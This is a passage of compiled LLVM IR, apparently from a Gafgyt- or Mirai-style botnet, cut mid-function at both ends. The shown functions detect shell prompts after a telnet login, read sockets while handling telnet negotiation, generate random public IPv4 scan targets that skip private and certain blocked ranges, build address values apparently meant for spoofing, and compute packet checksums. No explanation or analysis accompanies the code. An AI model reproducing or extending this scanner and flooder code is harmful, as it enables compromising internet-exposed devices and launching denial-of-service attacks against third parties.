.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !3
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* @ipState.1, align 1
  %4 = icmp eq i8 %3, 0
  br i1 %4, label %.critedge.preheader, label %5

; <label>:5:                                      ; preds = %0
  %6 = load i8, i8* @ipState.4, align 1
  %7 = icmp eq i8 %6, -1
  br i1 %7, label %.critedge.preheader, label %8

.critedge.preheader:                              ; preds = %0, %5
  br label %.critedge

; <label>:8:                                      ; preds = %5
  %9 = add i8 %6, 1
  store i8 %9, i8* @ipState.4, align 1
  %10 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %10, i8 0, i64 16, i32 16, i1 false)
  %11 = load i8, i8* @ipState.1, align 1
  %12 = zext i8 %11 to i32
  %13 = load i8, i8* @ipState.2, align 1
  %14 = zext i8 %13 to i32
  %15 = load i8, i8* @ipState.3, align 1
  %16 = zext i8 %15 to i32
  %17 = load i8, i8* @ipState.4, align 1
  %18 = zext i8 %17 to i32
  %19 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %10, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i64 0, i64 0), i32 %12, i32 %14, i32 %16, i32 %18)
  br label %155

.critedge:                                        ; preds = %.critedge.backedge, %.critedge.preheader
  %20 = tail call i32 @rand() #3
  %21 = srem i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* @ipState.0, align 1
  %23 = tail call i32 @rand() #3
  %24 = srem i32 %23, 255
  %25 = trunc i32 %24 to i8
  store i8 %25, i8* @ipState.1, align 1
  %26 = tail call i32 @rand() #3
  %27 = srem i32 %26, 255
  %28 = trunc i32 %27 to i8
  store i8 %28, i8* @ipState.2, align 1
  %29 = tail call i32 @rand() #3
  %30 = srem i32 %29, 255
  %31 = trunc i32 %30 to i8
  store i8 %31, i8* @ipState.3, align 1
  %32 = load i8, i8* @ipState.0, align 1
  switch i8 %32, label %37 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %33
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i8, i8* @ipState.1, align 1
  %35 = icmp ugt i8 %34, 63
  %36 = icmp sgt i8 %34, -1
  %or.cond = and i1 %35, %36
  br i1 %or.cond, label %.critedge.backedge, label %thread-pre-split227

thread-pre-split227:                              ; preds = %33
  %.pr228 = load i8, i8* @ipState.0, align 1
  br label %37

; <label>:37:                                     ; preds = %thread-pre-split227, %.critedge
  %38 = phi i8 [ %.pr228, %thread-pre-split227 ], [ %32, %.critedge ]
  switch i8 %38, label %42 [
    i8 127, label %.critedge.backedge
    i8 -87, label %39
  ]

; <label>:39:                                     ; preds = %37
  %40 = load i8, i8* @ipState.1, align 1
  %41 = icmp eq i8 %40, -2
  br i1 %41, label %.critedge.backedge, label %thread-pre-split

.critedge.backedge:                               ; preds = %39, %33, %37, %42, %47, %52, %59, %66, %70, %75, %80, %84, %89, %93, %98, %101, %105, %110, %113, %115, %119, %121, %127, %131, %135, %142, %56, %.critedge, %.critedge
  br label %.critedge

thread-pre-split:                                 ; preds = %39
  %.pr = load i8, i8* @ipState.0, align 1
  br label %42

; <label>:42:                                     ; preds = %thread-pre-split, %37
  %43 = phi i8 [ %.pr, %thread-pre-split ], [ %38, %37 ]
  %44 = icmp eq i8 %43, -84
  %45 = load i8, i8* @ipState.1, align 1
  %46 = icmp ult i8 %45, 17
  %or.cond50 = and i1 %44, %46
  br i1 %or.cond50, label %.critedge.backedge, label %47

; <label>:47:                                     ; preds = %42
  %48 = icmp eq i8 %43, -64
  %49 = icmp eq i8 %45, 0
  %or.cond52 = and i1 %48, %49
  %50 = load i8, i8* @ipState.2, align 1
  %51 = icmp eq i8 %50, 2
  %or.cond54 = and i1 %or.cond52, %51
  br i1 %or.cond54, label %.critedge.backedge, label %52

; <label>:52:                                     ; preds = %47
  %53 = icmp eq i8 %45, 88
  %or.cond56 = and i1 %48, %53
  %54 = icmp eq i8 %50, 99
  %or.cond58 = and i1 %or.cond56, %54
  %55 = icmp eq i8 %45, -88
  %or.cond60 = and i1 %48, %55
  %or.cond197 = or i1 %or.cond60, %or.cond58
  br i1 %or.cond197, label %.critedge.backedge, label %56

; <label>:56:                                     ; preds = %52
  %57 = icmp eq i8 %43, -58
  %58 = and i8 %45, -2
  %switch = icmp eq i8 %58, 18
  %or.cond198 = and i1 %57, %switch
  br i1 %or.cond198, label %.critedge.backedge, label %59

; <label>:59:                                     ; preds = %56
  %60 = load i8, i8* @ipState.0, align 1
  %61 = icmp eq i8 %60, -58
  %62 = load i8, i8* @ipState.1, align 1
  %63 = icmp eq i8 %62, 51
  %or.cond62 = and i1 %61, %63
  %64 = load i8, i8* @ipState.2, align 1
  %65 = icmp eq i8 %64, 100
  %or.cond64 = and i1 %or.cond62, %65
  br i1 %or.cond64, label %.critedge.backedge, label %66

; <label>:66:                                     ; preds = %59
  %67 = icmp eq i8 %60, -53
  %68 = icmp eq i8 %62, 0
  %or.cond66 = and i1 %67, %68
  %69 = icmp eq i8 %64, 113
  %or.cond68 = and i1 %or.cond66, %69
  br i1 %or.cond68, label %.critedge.backedge, label %70

; <label>:70:                                     ; preds = %66
  %71 = icmp eq i8 %60, -68
  %72 = icmp eq i8 %62, -47
  %or.cond70 = and i1 %71, %72
  %73 = icmp eq i8 %64, 52
  %74 = icmp eq i8 %64, 49
  %or.cond76213 = or i1 %73, %74
  %or.cond199 = and i1 %or.cond70, %or.cond76213
  br i1 %or.cond199, label %.critedge.backedge, label %75

; <label>:75:                                     ; preds = %70
  %76 = icmp eq i8 %60, -71
  %77 = icmp eq i8 %62, 62
  %or.cond78 = and i1 %76, %77
  %.off = add i8 %64, 67
  %78 = icmp ult i8 %.off, 2
  %79 = icmp eq i8 %64, -68
  %or.cond88215 = or i1 %79, %78
  %or.cond201 = and i1 %or.cond78, %or.cond88215
  br i1 %or.cond201, label %.critedge.backedge, label %80

; <label>:80:                                     ; preds = %75
  %81 = icmp eq i8 %62, 61
  %or.cond90 = and i1 %76, %81
  %82 = or i8 %64, 1
  %83 = icmp eq i8 %82, -119
  %or.cond202 = and i1 %or.cond90, %83
  br i1 %or.cond202, label %.critedge.backedge, label %84

; <label>:84:                                     ; preds = %80
  %85 = icmp eq i8 %62, 11
  %or.cond98 = and i1 %76, %85
  %86 = or i8 %64, 1
  %87 = icmp eq i8 %86, -109
  %88 = icmp eq i8 %64, -111
  %or.cond108218 = or i1 %88, %87
  %or.cond204 = and i1 %or.cond98, %or.cond108218
  br i1 %or.cond204, label %.critedge.backedge, label %89

; <label>:89:                                     ; preds = %84
  %90 = icmp eq i8 %60, 63
  %91 = icmp eq i8 %62, -115
  %or.cond110 = and i1 %90, %91
  %92 = icmp eq i8 %64, -15
  %or.cond112 = and i1 %or.cond110, %92
  br i1 %or.cond112, label %.critedge.backedge, label %93

; <label>:93:                                     ; preds = %89
  %94 = icmp eq i8 %60, 69
  %95 = icmp eq i8 %62, 30
  %or.cond114 = and i1 %94, %95
  %96 = icmp eq i8 %64, -64
  %97 = icmp eq i8 %64, -12
  %or.cond120219 = or i1 %96, %97
  %or.cond205 = and i1 %or.cond114, %or.cond120219
  br i1 %or.cond205, label %.critedge.backedge, label %98

; <label>:98:                                     ; preds = %93
  %99 = icmp eq i8 %62, -59
  %or.cond122 = and i1 %94, %99
  %100 = icmp eq i8 %64, -128
  %or.cond124 = and i1 %or.cond122, %100
  br i1 %or.cond124, label %.critedge.backedge, label %101

; <label>:101:                                    ; preds = %98
  %102 = icmp eq i8 %60, -94
  %103 = icmp eq i8 %62, -5
  %or.cond126 = and i1 %102, %103
  %104 = icmp eq i8 %64, 120
  %or.cond128 = and i1 %or.cond126, %104
  br i1 %or.cond128, label %.critedge.backedge, label %105

; <label>:105:                                    ; preds = %101
  %106 = icmp eq i8 %60, -83
  %107 = icmp eq i8 %62, -48
  %or.cond130 = and i1 %106, %107
  %108 = icmp eq i8 %64, -76
  %or.cond136220 = or i1 %100, %108
  %109 = icmp eq i8 %64, -6
  %or.cond140221 = or i1 %109, %or.cond136220
  %or.cond207 = and i1 %or.cond130, %or.cond140221
  br i1 %or.cond207, label %.critedge.backedge, label %110

; <label>:110:                                    ; preds = %105
  %111 = icmp eq i8 %60, -64
  %112 = icmp eq i8 %62, -69
  %or.cond142 = and i1 %111, %112
  %or.cond144 = and i1 %or.cond142, %69
  br i1 %or.cond144, label %.critedge.backedge, label %113

; <label>:113:                                    ; preds = %110
  %114 = icmp eq i8 %62, -52
  %or.cond146 = and i1 %61, %114
  %or.cond148 = and i1 %or.cond146, %92
  br i1 %or.cond148, label %.critedge.backedge, label %115

; <label>:115:                                    ; preds = %113
  %116 = icmp eq i8 %60, -52
  %117 = icmp eq i8 %62, 10
  %or.cond150 = and i1 %116, %117
  %118 = icmp eq i8 %64, -96
  %or.cond152 = and i1 %or.cond150, %118
  br i1 %or.cond152, label %.critedge.backedge, label %119

; <label>:119:                                    ; preds = %115
  %120 = icmp eq i8 %62, 12
  %or.cond154 = and i1 %116, %120
  %or.cond156 = and i1 %or.cond154, %96
  br i1 %or.cond156, label %.critedge.backedge, label %121

; <label>:121:                                    ; preds = %119
  %122 = icmp eq i8 %60, -48
  %123 = icmp eq i8 %62, 110
  %or.cond158 = and i1 %122, %123
  %124 = or i8 %64, 8
  %125 = icmp eq i8 %124, 72
  %or.cond208 = and i1 %or.cond158, %125
  %126 = icmp eq i8 %62, 67
  %or.cond166 = and i1 %122, %126
  %or.cond209 = or i1 %or.cond166, %or.cond208
  br i1 %or.cond209, label %.critedge.backedge, label %127

; <label>:127:                                    ; preds = %121
  %128 = icmp eq i8 %60, 94
  %129 = icmp eq i8 %62, 102
  %or.cond168 = and i1 %128, %129
  %130 = icmp eq i8 %64, 48
  %or.cond170 = and i1 %or.cond168, %130
  br i1 %or.cond170, label %.critedge.backedge, label %131

; <label>:131:                                    ; preds = %127
  %132 = icmp eq i8 %60, 93
  %133 = icmp eq i8 %62, -82
  %or.cond172 = and i1 %132, %133
  %134 = icmp eq i8 %64, 88
  %or.cond174 = and i1 %or.cond172, %134
  br i1 %or.cond174, label %.critedge.backedge, label %135

; <label>:135:                                    ; preds = %131
  %136 = icmp eq i8 %60, 89
  %137 = icmp eq i8 %62, -8
  %or.cond176 = and i1 %136, %137
  %138 = or i8 %64, 2
  %139 = icmp eq i8 %138, -82
  %.off226 = add i8 %64, 87
  %140 = icmp ult i8 %.off226, 2
  %141 = or i1 %140, %139
  %or.cond212 = and i1 %or.cond176, %141
  br i1 %or.cond212, label %.critedge.backedge, label %142

; <label>:142:                                    ; preds = %135
  %or.cond194 = and i1 %or.cond176, %118
  %143 = icmp ugt i8 %60, -33
  %or.cond196 = or i1 %143, %or.cond194
  br i1 %or.cond196, label %.critedge.backedge, label %144

; <label>:144:                                    ; preds = %142
  %145 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %145, i8 0, i64 16, i32 16, i1 false)
  %146 = load i8, i8* @ipState.0, align 1
  %147 = zext i8 %146 to i32
  %148 = load i8, i8* @ipState.1, align 1
  %149 = zext i8 %148 to i32
  %150 = load i8, i8* @ipState.2, align 1
  %151 = zext i8 %150 to i32
  %152 = load i8, i8* @ipState.3, align 1
  %153 = zext i8 %152 to i32
  %154 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %145, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i64 0, i64 0), i32 %147, i32 %149, i32 %151, i32 %153)
  br label %155

; <label>:155:                                    ; preds = %144, %8
  %.sink = phi i8* [ %145, %144 ], [ %10, %8 ]
  %156 = call i32 @inet_addr(i8* %.sink) #3
  ret i32 %156
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
